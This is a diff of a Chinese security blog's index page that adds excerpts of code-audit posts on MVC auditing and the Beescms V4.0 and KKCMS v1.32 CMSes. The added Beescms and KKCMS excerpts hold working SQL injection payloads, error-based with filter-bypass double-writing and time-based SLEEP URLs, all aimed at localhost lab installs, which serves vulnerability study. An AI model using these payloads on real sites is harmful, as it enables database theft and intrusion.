@@ -81,7 +81,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">8</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">25</span></a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">8</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">28</span></a></li>
   </ul>
 </nav>
 
@@ -126,7 +126,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -171,6 +171,321 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/08/12/%E5%85%A5%E9%97%A8MVC%E7%BB%93%E6%9E%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="LiAoRJ">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LiAoRJ的成长记录">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | LiAoRJ的成长记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/08/12/%E5%85%A5%E9%97%A8MVC%E7%BB%93%E6%9E%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">入门MVC结构代码审计</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-08-12 16:17:46 / 修改时间：16:30:34" itemprop="dateCreated datePublished" datetime="2022-08-12T16:17:46+08:00">2022-08-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="入门MVC结构代码审计"><a href="#入门MVC结构代码审计" class="headerlink" title="入门MVC结构代码审计"></a>入门MVC结构代码审计</h1><ul>
+<li>**Model :**模型层（用于数据库打交道）</li>
+<li>**View :**视图层（用于展示内容给用户看）</li>
+<li>**Controller :**控制层（控制业务逻辑）</li>
+</ul>
+<p>M是指业务模型，V是指用户界面，C则是控制器</p>
+<p>MVC各部分的职能：</p>
+<ul>
+<li>模型Model – 管理大部分的业务逻辑和所有的数据库逻辑。模型提供了连接和操作数据库的抽象层。</li>
+<li>控制器Controller - 负责响应用户请求、准备数据，以及决定如何展示数据。</li>
+<li>视图View – 负责渲染数据，通过HTML方式呈现给用户。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208121558721.gif" alt="MVC流程图"></p>
+<blockquote>
+<p>一个典型的Web MVC流程：</p>
+<ol>
+<li>Controller截获用户发出的请求；</li>
+<li>Controller调用Model完成状态的读写操作；</li>
+<li>Controller把数据传递给View；</li>
+<li>View渲染最终结果并呈献给用户。</li>
+</ol>
+</blockquote>
+<p>MVC 一般有两种审计模式：</p>
+<h4 id="直接审计控制器"><a href="#直接审计控制器" class="headerlink" title="直接审计控制器"></a>直接审计控制器</h4><blockquote>
+<p>也就C的内容，再追踪一些函数。全局搜索一下**filt__**，因为 <strong>filt</strong> 的英文意思为过滤，可以通过全局搜索这样式的函数来查看一下过滤规则。这种一般是比较快速审计。</p>
+<p>但是这种情况一般建立在你可以清晰明白该款CMS的路由规则，适合老鸟，方便根据审计出来的漏洞的点去回溯验证</p>
+</blockquote>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/12/%E5%85%A5%E9%97%A8MVC%E7%BB%93%E6%9E%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/08/11/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="LiAoRJ">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LiAoRJ的成长记录">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | LiAoRJ的成长记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/08/11/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">Beescms V4.0审计</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-08-11 23:34:36" itemprop="dateCreated datePublished" datetime="2022-08-11T23:34:36+08:00">2022-08-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-08-12 11:47:23" itemprop="dateModified" datetime="2022-08-12T11:47:23+08:00">2022-08-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="beescms"><a href="#beescms" class="headerlink" title="beescms"></a>beescms</h1><h2 id="前台管理登录界面注入"><a href="#前台管理登录界面注入" class="headerlink" title="前台管理登录界面注入"></a>前台管理登录界面注入</h2><p><a target="_blank" rel="noopener" href="http://127.0.0.1/beescms/admin/login.php">http://127.0.0.1/beescms/admin/login.php</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_html</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>()默认仅编码双引号</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">fl_html</span>(<span class="title function_ invoke__">fl_value</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line"><span class="variable">$rel</span>=<span class="variable">$GLOBALS</span>[<span class="string">&#x27;mysql&#x27;</span>]-&gt;<span class="title function_ invoke__">fetch_asc</span>(<span class="string">&quot;select id,admin_name,admin_password,admin_purview,is_disable from &quot;</span>.DB_PRE.<span class="string">&quot;admin where admin_name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27; limit 0,1&quot;</span>);	</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;&#x2F;爆破库名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;and extractvalue(1,concat(0x7e,select database(),0x7e))#</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;&#x2F;利用双写+空格绕过过滤<br>&#x2F;&#x2F;爆破表名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect table_name fr from om information_schema.tables wh where ere table_schema like &#x27;</span>beescms<span class="string">&#x27; limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/11/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="LiAoRJ">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LiAoRJ的成长记录">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | LiAoRJ的成长记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">KKCMS v1.32审计</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-08-11 23:34:36" itemprop="dateCreated datePublished" datetime="2022-08-11T23:34:36+08:00">2022-08-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-08-12 15:22:15" itemprop="dateModified" datetime="2022-08-12T15:22:15+08:00">2022-08-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="KKCMS-v1-32审计"><a href="#KKCMS-v1-32审计" class="headerlink" title="KKCMS v1.32审计"></a>KKCMS v1.32审计</h1><h2 id="前台注入1"><a href="#前台注入1" class="headerlink" title="前台注入1"></a>前台注入1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/bplay.php?play=a AND (SELECT 6254 FROM (SELECT(SLEEP(5)))hZmf)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="前台注入2"><a href="#前台注入2" class="headerlink" title="前台注入2"></a>前台注入2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/ucenter/active.php?verify=a&#x27; AND (SELECT 7219 FROM (SELECT(SLEEP(5)))VMtB) AND &#x27;qLKJ&#x27;=&#x27;qLKJ</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="未授权添加用户"><a href="#未授权添加用户" class="headerlink" title="未授权添加用户"></a>未授权添加用户</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/kkcms/ucenter/cms_user_add.php</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="后台注入"><a href="#后台注入" class="headerlink" title="后台注入"></a>后台注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/admin/cms_ad_edit.php?id=1 AND (SELECT 3894 FROM (SELECT(SLEEP(5)))RJzc)</span></span><br></pre></td></tr></table></figure>
+
+<p>这套一堆都是重复的注入</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -799,281 +1114,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2022/04/24/SRC%E5%A7%BF%E5%8A%BF(%E4%BA%94)/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/04/24/SRC%E5%A7%BF%E5%8A%BF(%E5%9B%9B)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/touxiang.jpg">
-      <meta itemprop="name" content="LiAoRJ">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="LiAoRJ的成长记录">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | LiAoRJ的成长记录">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/04/24/SRC%E5%A7%BF%E5%8A%BF(%E5%9B%9B)/" class="post-title-link" itemprop="url">SRC姿势(四)</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-04-24 23:08:14 / 修改时间：23:12:22" itemprop="dateCreated datePublished" datetime="2022-04-24T23:08:14+08:00">2022-04-24</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/SRC%E5%A7%BF%E5%8A%BF/" itemprop="url" rel="index"><span itemprop="name">SRC姿势</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="SRC姿势-四"><a href="#SRC姿势-四" class="headerlink" title="SRC姿势(四)"></a>SRC姿势(四)</h1><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204242311961.png" alt="image-20220424231133899"></p>
-<p>GitHub地址：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/LiAoRJ/src">LiAoRJ&#x2F;src: SRC姿势收集 (github.com)</a></p>
-
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/04/24/SRC%E5%A7%BF%E5%8A%BF(%E5%9B%9B)/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/04/24/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%89)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/touxiang.jpg">
-      <meta itemprop="name" content="LiAoRJ">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="LiAoRJ的成长记录">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | LiAoRJ的成长记录">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/04/24/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%89)/" class="post-title-link" itemprop="url">SRC姿势(三)</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-04-24 01:24:51" itemprop="dateCreated datePublished" datetime="2022-04-24T01:24:51+08:00">2022-04-24</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-04-27 17:14:05" itemprop="dateModified" datetime="2022-04-27T17:14:05+08:00">2022-04-27</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/SRC%E5%A7%BF%E5%8A%BF/" itemprop="url" rel="index"><span itemprop="name">SRC姿势</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          内容已加密，请输入密码
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/04/24/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%89)/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/04/23/%E6%B8%B8%E6%88%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E2%80%94%E2%80%94%E5%BE%85%E8%A1%A5%E5%85%85/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/touxiang.jpg">
-      <meta itemprop="name" content="LiAoRJ">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="LiAoRJ的成长记录">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | LiAoRJ的成长记录">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/04/23/%E6%B8%B8%E6%88%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E2%80%94%E2%80%94%E5%BE%85%E8%A1%A5%E5%85%85/" class="post-title-link" itemprop="url">游戏漏洞挖掘——待补充</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-04-23 23:42:01" itemprop="dateCreated datePublished" datetime="2022-04-23T23:42:01+08:00">2022-04-23</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-04-24 01:23:54" itemprop="dateModified" datetime="2022-04-24T01:23:54+08:00">2022-04-24</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/SRC%E5%A7%BF%E5%8A%BF/" itemprop="url" rel="index"><span itemprop="name">SRC姿势</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="游戏漏洞挖掘"><a href="#游戏漏洞挖掘" class="headerlink" title="游戏漏洞挖掘"></a>游戏漏洞挖掘</h1><h2 id="1、游戏实名认证"><a href="#1、游戏实名认证" class="headerlink" title="1、游戏实名认证"></a>1、游戏实名认证</h2><p>输入假的sfz号码 能过认证成功 &#x3D;&#x3D;漏洞</p>
-<p>tx低危 sn高危</p>
-
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/04/23/%E6%B8%B8%E6%88%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E2%80%94%E2%80%94%E5%BE%85%E8%A1%A5%E5%85%85/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
